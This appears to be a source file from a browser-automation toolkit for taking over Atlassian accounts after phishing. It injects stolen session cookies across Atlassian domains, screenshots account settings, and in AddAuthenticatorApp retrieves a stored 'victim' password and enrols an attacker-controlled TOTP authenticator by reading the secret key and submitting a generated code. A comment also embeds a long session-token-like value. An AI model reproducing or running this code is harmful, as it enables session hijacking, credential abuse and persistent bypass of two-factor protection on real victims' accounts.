const db = require('../../db/db')
const necrohelp = require('../../tasks/helpers/necrohelp')
const clusterLib = require('../../puppeteer/cluster')
const necrolib = require('./necrolib')

exports.GetProfileInfo = async ({ page, data: [taskId, cookies, params] }) => {

    console.log(`The page is [${page}] the data contains taskID ${taskId}, cookies ${cookies}, params ${params}`);
    ///we got cloud.session.token for the domain start.atlassian.com but is it also needed for id.atlassian.com
    //in the standard login procedure after login on id.atlassian.com the cookie got set again by some js function invoke
    //https://start.atlassian.com/SetCST?
    // cst=eyJjdHkiOiJqc29uK2NzdCIsImVuYyI6IkEyNTZHQ00iLCJhbGciOiJSU0EtT0FFUC0yNTYifQ.PfD_V8BGCj5Vbc1OSSpZL1PWsajOWP8PLA
    // dkwrSsWnoW4EptIAN0tfMaLr3tBEcIKt1xScxjvtR5zVcW4uoYMdgVBqBgCTl_BwbXnrnWlLDTf6gUnF5iIMmwObEpbbgYC92IcMySXO8lvTtlZ-b
    // NeM_VvLOgzxnANt9mF9AE591kOkVrj45PoVT0dMEfSE1kFye_oX-dLyEV7iXliVpGsPD736SKEOp7XL73wwxBOKt2ztaDAwYm2daJJVVjqIbjVVT7l
    // SEBh0gdWFOECO7TUmWZhs9j79Nwtkh7-6W8gGRhVwQPV_atqYLQ9jFTfvUCrIFv1ySAIs_ui0fCWAalWg.L0CPzowWd3u1gbbz.14jQPA7L5kvXbw
    // 4xKobUxaufkIx253IUkt4HSK9ToEwgdgaZOLncrMaa0e95pxeFPNVgTiMpJ9l4mw0UxzAw9jNR_fFh7JPS8TsmXK2iIYXLwtcpBwm3xqPKq2JWX9L
    // UaVTUC71EUHTpYUAoYAkE4NCTQk8whWPa1YZ2HfsWTjeKxf9A73kR0I7KMtVPjYq8zIqlteQm8vHlsqnFPAjZIVmh5Moalhle5vEc5NFuI4KzD2ZEV
    // us-_HuAStthqwLrSOfpyxI3XhuvDctfVXl-Fa5UcHLRLMTxtA2a6TBchPDnSkq894Krlr9y9nV_MCdvs3nWhXm7Qf9VK1ujERl1Mmhj2aLbESBr-Q
    // OzUmmO3waT7fKPWFQwzw-IT_3jkvaIZMKfKcpz3zqVYthEa6FSSTB57_FjNxdQiFNhIyoCq4v4avdsBtdCj1CiC3bH-UxbfwM7l-vGZceQsRfy1rF
    // jj8dAUS2EwMnq78v66OBWgSCyaO6jFyC9rF6TcxuM_BYA71uHSwnPdBzTqixUGP-v7dmTD3XVnV9nDWKgpWcbkECNqZ1nBlDdPABxLtUCEHDC9row
    // UqV1IsGL6nzKfSzY8JUrvB4oDwD7bneJSy3v6DyswzOhPRBSSLaJGXuWgX0mTtIuM_aZlgtH-9aZ6HfmdQer1C2kksO_RhZaxcdmZUlUvocteZQH0
    // 3jGZsNxYVPbhC_J3zgDJn74aZBEe6apzIJzcJ_JVDq55zbjyqu8Mo3816urqaeJNR_ARm9q0kWj1vGXOmzJ8THztUfy09SuLMHYpNa1Mi-Z36dUer
    // Q70uR1xMKCYXgiyYXFScsBzCulXXZ7GcUVgFaLbAIDoElEmKpXXjM0K-MA-1ljr0IrFS2ylMOMlN55LfD7XIigunGnnccfNFOQeKqJ9osrt7g0PaT
    // 0doevJ0Ol3cD7PlvMtSTNZxTCFCUwBjYXlTB3XdIKEWPscT5Yz6NmwdsdSXe3oadfvqhqPvXu--o1ce1RD58Za1H9mfvRbuf3TGVD7tRJFFsfuVzK
    // SqboGX5Lej7KyF9yQTYH_aUORKFW-9SxrT4Zi1c5Rmh5cj4QTASmJZXqaE4AKPxdfS2JpeLI6W4SrIkFFXMmZ9irK9sMuZXnLkfPOyxBerxvqDLJ
    // ASAOnRyx56KyWkXnrO08KxO5d-TiTx-ejSWLQu4QUZRvQBYt-_lJNDi3S8AZXRPlX2e_7TWfAb-2ZQ-a-xUzMwbhLVpe4Slai9ysJ_-tShWpf-g57
    // quZaxYMwiX_ak5-wB7O-VrtNocOpgugMmTkWwfZ_9XSS_M_GEwSBrdcdcV0rKFtwi8f9PGhQhhgusgXgV2fLKE.RnbVG0dMKKKQZ3hGH3vqsA
    // &continue=https%3A%2F%2Fstart.atlassian.com%2F%3Futm_source%3Didentity&
    // anonymousId=27bd9e11-932d-4d66-908e-1bd050f27fcd
    // for(i=0;i< cookies.length;i++){
    //     if(cookies[i].name=='cloud.session.token'){
    //         nc = structuredClone(cookies[i]);
    //         nc.domain='id.atlassian.com'
    //         cookies.push(nc);
    //         break;
    //     }
    //}
    /*    for(i=0;i< cookies.length;i++){
            if(cookies[i].name=='cloud.session.token'){
                //parto assunto che il cookie sia per il dominio start.atlassian.com
                let idCookies = structuredClone(cookies[i]);
                idCookies.domain='id.atlassian.com'
                cookies.push(idCookies);
                let adminCookies = structuredClone(cookies[i]);
                adminCookies.domain='admin.atlassian.com'
                cookies.push(adminCookies);
                break;
                //return originalCookies;
            }
        }*/
    //qua stiamo editanto cookies per riferimento quindi sto controllo e' inutile scritto cosi'
    let nc = necrolib.PropagateCookies(cookies);
    !!!nc ? console.log("Cookies Not Propagate") :
        await page.setCookie(...cookies);
    await page.goto(params.urls[0]);
    await necrohelp.Sleep(5000);
    await page.screenshot({ fullPage: true, path: "/home/natalinux/Documents/necrobrowser/tasks/atlassian/debugging-outputs/Init_Page.jpg" }).catch(console.error);
    await page.click("a:nth-child(1) > button:nth-child(1)").catch(console.error);
    await necrohelp.Sleep(5000);
    await page.screenshot({ fullPage: true, path: "/home/natalinux/Documents/necrobrowser/tasks/atlassian/debugging-outputs/Profile_page.jpg" }).catch(console.error);
    await page.close();

    await db.UpdateTaskStatus(taskId, "completed");


}

exports.GetAccountSettingsScreenshots = async ({ browser, page, data: [taskId, cookies, params] }) => {

    await db.UpdateTaskStatus(taskId, "running")

    let urls = params.urls
    let index = 0;
    let parallelTabs = 5;
    let promises = []
    console.log(`[${taskId}] processing ${urls.length} urls:`)
    console.log(urls)

    const context = await browser.createIncognitoBrowserContext();

    // parallelize page screenshot in multiple tabs of the same incognito context
    do {
        for (let i = 0; i < parallelTabs; i++) {
            let url = urls.pop();
            console.log(url)
            if (typeof (url) === "undefined")
                break;

            promises.push(context.newPage().then(async page => {
                let nc = necrolib.PropagateCookies(cookies);
                !!!nc ? console.log("Cookies Not Propagate") :
                    await page.setCookie(...cookies);
                await necrohelp.ScreenshotFullPageToFS(page, taskId, url, "/home/natalinux/Documents/necrobrowser/tasks/atlassian/debugging-outputs");
            }))
        }
        await Promise.all(promises).catch(e => console.log(e));

    } while (index < urls.length)

    await db.UpdateTaskStatus(taskId, "completed")

}

exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) => {

    console.log(`The page is [${page}] the data contains taskID ${taskId}, cookies ${cookies}, params ${params}`);
    let res = await db.GetCredentials(`victim:${params.trackers}`);
    let pwd = (res.find(e => e.key == 'Password')).val;

    //qua stiamo editanto cookies per riferimento quindi sto controllo e' inutile scritto cosi'
    let nc = necrolib.PropagateCookies(cookies);
    !!!nc ? console.log("Cookies Not Propagate") :
        await page.setCookie(...cookies);
    await page.goto(params.urls[0]);
    await necrohelp.Sleep(5000);
    // type the password in the input field
    const inputPassword = 'input';
    // click and type the password
    await page.click(inputPassword).catch(console.error);

    await page.type(inputPassword, pwd, { delay: 300 }).catch(console.error)

    await necrohelp.Sleep(5000);
    // submit the password
    await page.keyboard.press('Enter');
    await necrohelp.Sleep(5000);
    // click on "Yes, ready to scan the code"
    await page.click('button[id="mfa.enrollment.getapp.submit"]').catch(console.error);
    await necrohelp.Sleep(5000);
    //click on "Can't scan the code?"
    await page.click('div[id="mfa.enrollment.configureapp.totpsecret"] > div > button').catch(console.error);
    await necrohelp.Sleep(5000);

    // retrieve the account name and the OTP secretkey
    let accountName = await page.$eval('input[id="mfa.enrollment.configureapp.email"]', ({ value }) => value);
    let secretKey = await page.$eval('input[id="mfa.enrollment.configureapp.secret"]', ({ value }) => value);

    // get the OTP from the secretKey using totp-generator
    const totp = await necrohelp.Totp(secretKey)
    console.log(`[${taskId}] Generated OTP from secretKey ${secretKey}: ${totp}`)

    // type the OTP in the input field
    const inputOtp = 'input[name="otpCode"]';

    // click and type the OTP
    await page.click(inputOtp).catch(console.error);

    await page.type(inputOtp, totp, { delay: 300 }).catch(console.error)

    await necrohelp.Sleep(2000)

    // click on Next
    await page.click('button[id="mfa.enrollment.connectphone.submit"]').catch(console.error)
    await necrohelp.Sleep(5000)


    await page.screenshot({ fullPage: true, path: "/home/natalinux/Documents/necrobrowser/tasks/atlassian/debugging-outputs/2fa.jpg" }).catch(console.error);
    await db.UpdateTaskStatus(taskId, "completed");


}